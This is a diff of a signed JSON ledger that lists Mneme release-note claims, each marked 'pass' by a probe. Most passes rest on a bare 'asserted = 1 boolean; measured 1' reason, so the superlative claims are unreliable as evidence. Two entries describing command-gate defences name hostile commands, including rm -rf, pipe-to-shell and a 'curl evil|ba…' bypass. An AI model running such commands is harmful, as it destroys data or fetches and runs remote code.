+        "text": "Mneme ships LAUNCH WINDOW — a SpaceX-style GO/NO-GO release verdict aggregator that runs ALL gates (TRUTH GATE subset + PERF BUDGET + INDISPENSABILITY + WIRING LAG + PROBE COVERAGE + SDK BUILT) and emits a single status + HMAC-signed certif",
+        "source": "v2.56.0 release notes",
+        "probeId": "probe.xai.launch_window_ready",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.xai.dragon_chain_intact",
+        "text": "Mneme ships DRAGON EJECT — emergency rollback primitive that emits a GAVEL-grade forensic bundle (Merkle proof binding rationale + reverted diff) + HMAC-chained eject ledger. Chain integrity is verifiable offline",
+        "source": "v2.56.0 release notes",
+        "probeId": "probe.xai.dragon_chain_intact",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.xai.stargate_bundle_seal",
+        "text": "Mneme ships STARGATE — open-source publisher for the augmented calibration corpus (15 fixtures × 6 vendors × 6 augmentations = 540 fixtures), MIT-licensed, with SHA-256 content seal + HMAC attestation. Makes Mneme the Switzerland of AI vend",
+        "source": "v2.56.0 release notes",
+        "probeId": "probe.xai.stargate_bundle_seal",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.sdk.world_class",
+        "text": "Mneme ships @mneme-ai/sdk — a world-class premium in-process SDK that AI vendors can embed without subprocess overhead. 30-80× faster than `mneme <verb>` CLI (proven via built-in benchmark.vsCli). 7 wild features: createMneme factory, brand",
+        "source": "v2.55.0 release notes",
+        "probeId": "probe.sdk.world_class",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.nemesis.world_class_premium_primitives",
+        "text": "Mneme ships 3 world-class premium NEMESIS extensions inspired by v2.53 audit Tier-2/3: LETHE (GDPR forget with Merkle exclusion proof), GAVEL (court-admissible bundle binding THEMIS + EU stamp + SIBYL via Merkle tree), NIMBUS (federated tru",
+        "source": "v2.54.0 release notes",
+        "probeId": "probe.nemesis.world_class_premium_primitives",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.perf.budgets_met",
+        "text": "Mneme's 5 hot-path operations (extract_fingerprint / classify_calibrated / eu_stamp / stealth_score / janus_observe) stay within published per-op performance budgets; release-script gate refuses tag on regression",
+        "source": "v2.54.0 release notes",
+        "probeId": "probe.perf.budgets_met",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.audit.open_wounds_patched",
+        "text": "Mneme patches all 8 open wounds from the v2.52 session audit: P0-1 HMAC key wizard auto-generates + STRICT mode refuses default-insecure; P0-2 probe coverage gate accepts a percentage threshold (default 50%); P0-3 wiring-lag CI gate parses ",
+        "source": "v2.53.0 release notes",
+        "probeId": "probe.audit.open_wounds_patched",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.nemesis.million_dollar_diamonds",
+        "text": "Mneme ships 6 NEMESIS extensions (STEALTH SCORE / CAPILLARY 50+ micro-tells / COLOSSEUM auto-tournament with 3-axis HMAC leaderboard / MOLT silent model-rotation detector / THEMIS alibi verifier / SIBYL ZK identity commitment) — each functi",
+        "source": "v2.52.0 release notes",
+        "probeId": "probe.nemesis.million_dollar_diamonds",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.audit.reproduction_suite_passes",
+        "text": "Mneme passes all 11 audit categories from the external v2.50 audit table (edge-case verdict / MCP tool-name fuzz 20/20 / validateArgs / hot-path throughput / deterministic verdict lock / META-SELF-VERIFIER / truncation receipt / lineage def",
+        "source": "v2.51.0 release notes",
+        "probeId": "probe.audit.reproduction_suite_passes",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.nemesis.real_accuracy_85",
+        "text": "NEMESIS calibrated classifier achieves ≥85% accuracy on a HELD-OUT real-corpus-shaped fixture set (header-less diffs + natural variation) — not just the seed corpus",
+        "source": "v2.48.0 release notes",
+        "probeId": "probe.nemesis.classify_accuracy_real_corpus",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.auto_init.zero_command",
+        "text": "Mneme bootstraps on first MCP tool call — user never needs to run `mneme init` manually; idempotent + dev-tooling-folder-aware",
+        "source": "v2.45.0 release notes",
+        "probeId": "probe.auto_init.zero_command_install_works",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.argus11.world_first_multimodal",
+        "text": "Mneme ships world's first truth-aware multimodal search: text+code+image ranked in one pass, parallel sub-second on 4 concurrent queries, ≥9 live vendor adapters, HMAC-verifiable result frame",
+        "source": "v2.41.0 release notes",
+        "probeId": "probe.argus11.world_first_multimodal",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.loopguard.objective_thrash",
+        "text": "Mneme LOOPGUARD detects objective THRASHING (the same failure-signature repeated ≥threshold times in a window with no success in between — an agent/human stuck in a loop) deterministically, breaks the loop by surfacing the Cortex's known re",
+        "source": "v2.110.0 release notes",
+        "probeId": "probe.loopguard.objective_thrash",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.distill.measured_reduction",
+        "text": "Mneme DISTILL compresses a verbose {error log + diff} into the minimal causal brief (failure line + changed file:line loci + the Cortex's known fix) and reports a MEASURED token-budget receipt — character reduction EXACT, token figure a LAB",
+        "source": "v2.111.0 release notes",
+        "probeId": "probe.distill.measured_reduction",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.nkl.proven_dead_end",
+        "text": "Mneme NKL auto-derives PROVEN dead-ends from the absorb event ledger (a base command failed ≥N times across all history with ZERO successes) so an agent avoids repeating a proven-trap approach (cross-session/cross-vendor); advisory not a ha",
+        "source": "v2.112.0 release notes",
+        "probeId": "probe.nkl.proven_dead_end",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.treasury.monoid_million_case",
+        "text": "Mneme TOKEN TREASURY accumulates MEASURED token-savings deltas (distill/loopguard/nkl) into a signed append-only ledger whose aggregate is a commutative MONOID; proven over a real 1,000,000-case discrete-math sweep (O(N) time, O(1) space): ",
+        "source": "v2.115.0 release notes",
+        "probeId": "probe.treasury.monoid_million_case",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.visual.portable_render",
+        "text": "Mneme's VISUAL KNOWLEDGE MAP is a pure, dependency-free renderer that gracefully degrades (truecolor RGB gradients → 256-color → plain Unicode/ASCII) so it is beautiful where it can be and never garbles where it can't — the 'works everywher",
+        "source": "v2.116.0 release notes",
+        "probeId": "probe.visual.portable_render",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.firewall.injection_defense",
+        "text": "Mneme's STRUCTURAL CONTEXT FIREWALL defends against Indirect Prompt Injection (OWASP LLM01 — the #1 LLM risk): before an agent ingests untrusted file content (a dependency, a fetched page, an external commit), known injection patterns hidde",
+        "source": "v2.130.0 release notes",
+        "probeId": "probe.firewall.injection_defense",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.stele.capability_inscription",
+        "text": "Mneme's STELE is a signed, merkle-rooted, delta-syncable inscription of its whole capability surface — pillar 1 of the membrane that makes 'an AI agent doesn't know a tool exists / holds a stale manifest' a structural impossibility, not a p",
+        "source": "v2.137.0 release notes",
+        "probeId": "probe.stele.capability_inscription",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.moat.deterministic_scorer",
+        "text": "Mneme's MOAT scorer answers 'did the moat actually improve?' with a deterministic, SIGNED number — not an opinion. It scores the moat across seven dimensions (accountability-spine · switching-cost · data-flywheel · accountability-standard ·",
+        "source": "v2.150.0 release notes",
+        "probeId": "probe.moat.deterministic_scorer",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.canon.accountability_standard",
+        "text": "Mneme's CANON is the Accountability-Record Standard (moat #2 — the 'NVD/Visa-of-AI'): a single, VERSIONED, Ed25519 OFFLINE-verifiable record format for 'an AI did/decided X, here's the proof' that ANY third party (auditor / insurer / regula",
+        "source": "v2.149.0 release notes",
+        "probeId": "probe.canon.accountability_standard",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.siege.bypass_resistance",
+        "text": "Mneme's SIEGE is the Adversarial Self-Bounty (moat #3): a command-gate with a PUBLIC, SIGNED, ever-rising bypass-resistance score. Mneme fires its own attack corpus (rm -rf, pipe-to-shell, base64/hex-decode, find -delete, $IFS, var-indirect",
+        "source": "v2.148.0 release notes",
+        "probeId": "probe.siege.bypass_resistance",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.mycelium.sovereign_flywheel",
+        "text": "Mneme's MYCELIUM is the Sovereign Data Flywheel — the moat-builder that fixes Mneme's weakest dimension (no data flywheel) the way only a local-first, signed system can: it compounds WITHOUT centralizing data. Every node keeps its data LOCA",
+        "source": "v2.147.0 release notes",
+        "probeId": "probe.mycelium.sovereign_flywheel",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.gateway.intent_routing",
+        "text": "Mneme's INTENT GATEWAY fixes the load-bearing weakness — a user types FREE natural language (any language, EN/Thai), never memorizes a command, and the Gateway picks the RIGHT Mneme command for the best result. It is a curated bilingual con",
+        "source": "v2.146.0 release notes",
+        "probeId": "probe.gateway.intent_routing",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.discover.singularity_tool_search",
+        "text": "Mneme's SINGULARITY SEARCH solves the load-bearing adoption problem: 900+ tools are worthless if an AI agent doesn't know a capability exists or can't pick the right one mid-chat. It compresses the whole catalog into an inverted index (the ",
+        "source": "v3.139.0 release notes",
+        "probeId": "probe.discover.singularity_tool_search",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.cosmos.singularity_and_gravity",
+        "text": "Mneme's COSMOS is the cosmo-quantum memory core — two black-sheep ideas drawn from a Big-Bang/quantum vision but made CLASSICALLY REAL and MEASURABLE (the literal physics can't run on a classical machine and 'sees the future, never wrong' i",
+        "source": "v3.138.0 release notes",
+        "probeId": "probe.cosmos.singularity_and_gravity",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.ark.accountable_reproduction",
+        "text": "Mneme's ARK is the accountable AI-reproduction & inheritance protocol — the capstone that fuses the four genetic pillars (trust substrate · inherited verified context · scar ledger · reproduction) into how an agent SAFELY gives birth to a c",
+        "source": "v3.136.0 release notes",
+        "probeId": "probe.ark.accountable_reproduction",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.pr_engine.launch_copy_cannot_lie",
+        "text": "Mneme's PR ENGINE generates a launch kit (Hacker News post · X thread · Reddit post · changelog) where every candidate claim is VERICERT-screened first: an overclaiming, fabricated, or unfalsifiable-superlative claim ('world's best', '100% ",
+        "source": "v3.135.0 release notes",
+        "probeId": "probe.pr_engine.launch_copy_cannot_lie",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.context_passport.cross_agent_verified_context",
+        "text": "Mneme's CONTEXT PASSPORT fills the gap every AI agent has — no context outside its own ecosystem. Each agent (Claude, Cursor, Devin, a custom one) is a silo; what one learns, the next (a different vendor/session/tool) starts blind to, so ag",
+        "source": "v3.134.0 release notes",
+        "probeId": "probe.context_passport.cross_agent_verified_context",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.pr_review.grounded_pr_comment",
+        "text": "Mneme's PR REVIEW puts the whole stack in the daily dev loop: on every pull request the GitHub bot posts ONE grounded comment fusing a VERICERT of the PR title/description (catching a hallucinated or overconfident claim), the git-native CON",
+        "source": "v3.133.0 release notes",
+        "probeId": "probe.pr_review.grounded_pr_comment",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.repo_brief.context_capsule",
+        "text": "Mneme's REPO BRIEF (the Context Capsule) is the Path-A moat: Mneme is not a commoditized 'memory product' but GIT-NATIVE SHARED CONTEXT for multi-agent teams. It fuses a repo's git history into ONE signed-able, portable, local-first object ",
+        "source": "v3.132.0 release notes",
+        "probeId": "probe.repo_brief.context_capsule",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.seance.past_self_grounded_context",
+        "text": "Mneme's SÉANCE lets you talk to your past self: pick any commit (or 'N months ago') and it reconstructs the DECISION CONTEXT that was true then — what you said in that commit, the surrounding commits (what you were working on), the TODOs yo",
+        "source": "v3.128.0 release notes",
+        "probeId": "probe.seance.past_self_grounded_context",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.commit_persona.git_style_cartoon",
+        "text": "Mneme's COMMIT PERSONA turns a repo's REAL git history into a measured persona per contributor + a distinct cartoon avatar — because every developer commits differently. It derives deterministic signals from git (conventional-commit rate, b",
+        "source": "v3.123.0 release notes",
+        "probeId": "probe.commit_persona.git_style_cartoon",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.vericert.deliverable_certificate",
+        "text": "Mneme's VERICERT is the trust/accountability layer the AI-worker gold rush (DeerFlow / Cursor / Devin / agent fleets) is missing: everyone builds the worker, nobody certifies the work. Feed it an AI-produced deliverable (report / code / ans",
+        "source": "v3.120.0 release notes",
+        "probeId": "probe.vericert.deliverable_certificate",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.hpe.hallucination_protection",
+        "text": "Mneme's HPE (Hallucination Protection Engine) is the honest answer to 'build a hallucination-protection engine': it does NOT claim 0% hallucination (a theoretical impossibility for open-ended generation), it drives CONFIDENTLY-WRONG output ",
+        "source": "v3.117.0 release notes",
+        "probeId": "probe.hpe.hallucination_protection",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.statguard.misinterpretation_guard",
+        "text": "Mneme's STATGUARD adopts Greenland, Senn, Rothman, Carlin, Poole, Goodman & Altman (2016), 'Statistical tests, P values, confidence intervals, and power: a guide to misinterpretations' (Eur J Epidemiol 31:337-350) into a deterministic guard",
+        "source": "v3.116.0 release notes",
+        "probeId": "probe.statguard.misinterpretation_guard",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.sdc.consensus_decode",
+        "text": "Mneme's SDC (Syndrome-Decoded Consensus) is error-correction for a MULTI-AGENT trust mesh — the honest, classical realization of the one deeply-transferable idea from Peter Shor's QEC lectures (CSS / syndrome decoding): treat the attestatio",
+        "source": "v3.114.0 release notes",
+        "probeId": "probe.sdc.consensus_decode",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.morph.polymorphic_surface",
+        "text": "Mneme's MORPH is the polymorphic plug — the single front door that makes Mneme attractive to AI agents (Cursor / Cline / Windsurf / Claude Code). Instead of facing 600+ static MCP tools it has never seen, an agent learns ONE tool — `mneme.m",
+        "source": "v3.108.0 release notes",
+        "probeId": "probe.morph.polymorphic_surface",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.governor.agent_governance",
+        "text": "Mneme's AGENT GOVERNOR is the capstone: an orchestrator-agnostic, signed governance kernel that sits UNDER any agent platform (Astra / Claude Code / Tycoon / AutoGen / CrewAI) and makes a fleet of autonomous agents provably safe + accountab",
+        "source": "v2.145.0 release notes",
+        "probeId": "probe.governor.agent_governance",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.axia.value_ledger",
+        "text": "Mneme's AXIA is a signed, hash-chained, OFFLINE-verifiable Value Ledger — pillar 2 of the membrane. It fuses the value events Mneme's organs actually produced (tokens saved from the treasury, destructive commands GATED by HEPHAESTUS/CERBERU",
+        "source": "v2.138.0 release notes",
+        "probeId": "probe.axia.value_ledger",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.membrane.fusion",
+        "text": "Mneme's MEMBRANE is the capstone that FUSES the three membrane pillars — CAPABILITY (STELE: a merkle-rooted, delta-syncable surface), ACTIVATION (BOOT: a when→tool decision table), and VALUE (AXIA: a hash-chained, offline-verifiable value l",
+        "source": "v2.164.0 release notes",
+        "probeId": "probe.membrane.fusion",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.matrix.pipe_integrity",
+        "text": "Mneme's MATRIX RAIL is the local-first, gRPC-ready pipe core: ANY payload (0 bytes → tens of MB, raw binary, unicode, deeply-nested JSON) flows through ordered, compressed (zlib), hash-manifested frames and arrives BYTE-IDENTICAL, or the ra",
+        "source": "v2.166.0 release notes",
+        "probeId": "probe.matrix.pipe_integrity",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.trustless.proof_carrying",
+        "text": "Mneme's TRUSTLESS MCP makes a tool result PROOF-CARRYING: it attaches an Ed25519 `_proof` over the SHA-256 of the result's data, so the calling model verifies it OFFLINE (with the embedded public key — no network, no trusting Mneme) instead",
+        "source": "v2.165.0 release notes",
+        "probeId": "probe.trustless.proof_carrying",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.adamas.self_healing_memory",
+        "text": "Mneme's ADAMAS is QEC-inspired self-healing memory: a fact is encoded with a real MDS erasure code (a Cauchy matrix over GF(256), the Reed-Solomon family) into K data + M parity shards, each SHA-256-sealed under a block root; a per-shard sy",
+        "source": "v2.168.0 release notes",
+        "probeId": "probe.adamas.self_healing_memory",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.prism.superposition_reasoning",
+        "text": "Mneme's PRISM is superposition reasoning with interference collapse: fan a question into N candidate branches (over the Matrix rail — parallel), keep them in superposition with amplitude √confidence, let them INTERFERE (agreeing branches ad",
+        "source": "v2.169.0 release notes",
+        "probeId": "probe.prism.superposition_reasoning",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.goldilocks.habitable_zone",
+        "text": "Mneme's GOLDILOCKS is the honest engineering core of the 'cosmic fine-tuning' idea: sensitivity analysis / boundary-finding, NOT cosmology. Given a numeric config value, a range, and a deterministic pass/fail oracle, it bisects outward from",
+        "source": "v2.174 release notes",
+        "probeId": "probe.goldilocks.habitable_zone",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.perfcore.correctness_preserving_accel",
+        "text": "Mneme's PERFCORE is the High-Performance Core (Missing Links #3), done the only honest way: a command-gate that goes faster WITH A SIGNED PROOF it changed zero verdicts. CERBERUS's cost is the recursive explode() that decomposes a command i",
+        "source": "v2.144.0 release notes",
+        "probeId": "probe.perfcore.correctness_preserving_accel",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.drift.mission_drift",
+        "text": "Mneme's DRIFT is the Context-Forensics layer (Missing Links #2): continuous, signed detection of an agent slowly straying from its declared mission across turns — before the drift becomes damage. The out-of-box mechanism: treat the agent's ",
+        "source": "v2.143.0 release notes",
+        "probeId": "probe.drift.mission_drift",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.crucible.settlement_gate",
+        "text": "Mneme's CRUCIBLE is the File-level Settlement Gate: before an AI's diff is allowed to touch the real working tree, it is applied in a SHADOW git worktree (which shares .git — cheap, not a full copy, and not a kernel sandbox), built + tested",
+        "source": "v2.142.0 release notes",
+        "probeId": "probe.crucible.settlement_gate",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.haunt.code_haunting",
+        "text": "Mneme's HAUNT ('Code Haunting' / Git Telepathy) makes the ghost of the commit that last touched a region audible: given a file (+ optional line range + the symptom from an alert), it gathers real git facts and returns one plain-language rep",
+        "source": "v2.141.0 release notes",
+        "probeId": "probe.haunt.code_haunting",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.regret.oracle_calibration",
+        "text": "Mneme's REGRET ORACLE is a signed, cross-vendor CALIBRATION of how often an edit carrying a given signal was ACTUALLY regretted later — reverted, or its test failed — and is the honest opposite of fortune-telling. It is backward-looking: fe",
+        "source": "v2.140.0 release notes",
+        "probeId": "probe.regret.oracle_calibration",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.pce.proof_carrying_edit",
+        "text": "Mneme's PCE (Proof-Carrying Edit) makes an AI's diff travel with a SIGNED certificate of what it statically does and does NOT do — the way proof-carrying code (Necula 1996) made a binary carry a machine-checkable proof of its safety propert",
+        "source": "v2.139.0 release notes",
+        "probeId": "probe.pce.proof_carrying_edit",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.elleipsis.completeness_gate",
+        "text": "Mneme's ELLEIPSIS is the savant of COMPLETENESS — the diamond a model vendor structurally won't build, because it surfaces what their model silently FAILED to do. Everyone checks whether what an AI said is true (hallucination); almost nobod",
+        "source": "v2.136.0 release notes",
+        "probeId": "probe.elleipsis.completeness_gate",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.cerberus.command_gate_reachability",
+        "text": "Mneme's CERBERUS hardens the HEPHAESTUS command gate against the pipe-to-shell / interpreter-eval / encoded-exec / indirection RCE-bypass class that a denylist can never win. Instead of classifying the LEADING token (which let `curl evil|ba",
+        "source": "v2.135.0 release notes",
+        "probeId": "probe.cerberus.command_gate_reachability",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.boot.activation_cortex",
+        "text": "Mneme's ACTIVATION CORTEX (`mneme boot` / `mneme.boot`) is the honest fix for the 'install and hope' problem — after an agent installs Mneme it often doesn't know WHEN to use the tools, so they sit idle. Boot returns a structured task→tool ",
+        "source": "v2.133.0 release notes",
+        "probeId": "probe.boot.activation_cortex",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.rail.governed_traversal",
+        "text": "Mneme is the CONTEXT RAIL — the single governed pipe every payload crosses between a local workspace and a hosted model, the honest 'Visa rail' of AI context. It unifies the seven Context-Gateway layers Mneme already ships into ONE auditabl",
+        "source": "v2.131.0 release notes",
+        "probeId": "probe.rail.governed_traversal",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.policy.deterministic_gate",
+        "text": "Mneme's DYNAMIC POLICY ENFORCEMENT (mneme.policy.json) is the deterministic, fail-closed access gate the Context Rail consults before any local context crosses to a model — Layer 2 of the rail. It denies known secret/PII surfaces by path-gl",
+        "source": "v2.131.0 release notes",
+        "probeId": "probe.policy.deterministic_gate",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.settlement.signed_chain_audit",
+        "text": "Mneme's CONTEXT TRANSACTION SETTLEMENT LEDGER is the honest core of the image's 'Stripe of AI Context / Global Settlement Layer / Context Transaction Fee' — a hash-chained, offline-auditable record of every AI↔local context exchange (the bl",
+        "source": "v2.129.0 release notes",
+        "probeId": "probe.settlement.signed_chain_audit",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.channel.state_channel_loop",
+        "text": "Mneme's CONTEXT-STATE CHANNEL is the honest 'L2 Lightning' for an AI edit/debug loop: the agent opens a channel over files (Mneme holds the working copy locally), sends tiny diff ops, gets COMPACT deltas back (ok + one-line brief + structur",
+        "source": "v2.128.0 release notes",
+        "probeId": "probe.channel.state_channel_loop",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.blind.reversible_structure_preserving",
+        "text": "Mneme's CONTEXT BLINDING is the honest, fast core of 'code never leaks to the model': before code is sent to a hosted model, secret literals are REMOVED and sensitive identifier names become reversible local placeholders (SecretFinancialEng",
+        "source": "v2.127.0 release notes",
+        "probeId": "probe.blind.reversible_structure_preserving",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.scaffold.known_template_deterministic",
+        "text": "Mneme's SCAFFOLD is the HONEST core of 'Blueprint Inflation': an agent emits a compact spec for a KNOWN template (ts-model + CRUD, test-skeleton, config) and Mneme deterministically expands it into boilerplate locally — saving OUTPUT tokens",
+        "source": "v2.126.0 release notes",
+        "probeId": "probe.scaffold.known_template_deterministic",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.outline.skeleton_region_exact",
+        "text": "Mneme's OUTLINE lets any AI agent (vendor-neutral, via CLI or MCP) read a code file's structural SKELETON — every symbol + EXACT line range, bodies elided — for a fraction of the tokens instead of loading the whole file, then fetch the byte",
+        "source": "v2.124.0 release notes",
+        "probeId": "probe.outline.skeleton_region_exact",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.bequest.inheritance_math_sound",
+        "text": "Mneme's BEQUEST (Second Brain Inheritance) turns key-person-risk DETECTION into knowledge SURVIVAL: survival S(u)=1−∏(1−fluency) (reliability redundancy over git-derived holders), inheritance completeness + ORPHANED mass = mass-weighted sur",
+        "source": "v2.122.0 release notes",
+        "probeId": "probe.bequest.inheritance_math_sound",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.exec.roi_math_sound",
+        "text": "Mneme's EXEC layer frames REAL signals for an executive (key-person/bus-factor risk from atrophy, talent map from stigmergy, governance/promise-debt from promise, realized value from the treasury ledger, MCP attack surface from skeleton_key",
+        "source": "v2.120.0 release notes",
+        "probeId": "probe.exec.roi_math_sound",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.egress.sovereign_guard",
+        "text": "Mneme's SOVEREIGN EGRESS GUARD is a deterministic outbound boundary that pattern-redacts known secret classes, trips on HONEYTOKEN canaries (exfiltration → BLOCK), catches registered secrets via a one-way Bloom filter that NEVER stores the ",
+        "source": "v2.118.0 release notes",
+        "probeId": "probe.egress.sovereign_guard",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted = 1 boolean; measured 1"
+      },
+      {
+        "id": "claim.honesty_ledger.signed_verifiable",
+        "text": "Mneme emits a PUBLIC HONESTY LEDGER — a signed (Ed25519), offline-verifiable record of every public claim + its probe + last-measured verdict. Anyone verifies it with the embedded key alone: the signature, the inline payload hash, AND that ",
+        "source": "v3.143.0 release notes — PUBLIC HONESTY LEDGER",
+        "probeId": "probe.honesty_ledger.signed_verifiable",
+        "severity": "block",
+        "verdict": "pass",
+        "reason": "asserted true; measured true"
+      }
+    ]
+  },
+  "issuer": "MCowBQYDK2VwAyEAE8LE7MxyTrZatGLYHP0O4Kj4OoOzKHsRmLJBScBuPmM=",
+  "issuerFingerprint": "9de66ee802256bee",
+  "issuedAt": 1782198249696,
+  "prev": null,
+  "receiptId": "af4efb6e83336d787033cdcd582f735937c85c15e99f597438738929d869a683",
+  "sig": "qBhZJ6FSlZK41vV7VZUiIXIwHG29nGj+DZQO/2Ha15pMSZTHEToDh7UQ0m/yyvIIK1i+fbmAClOKl4izT+NsAg=="
+}
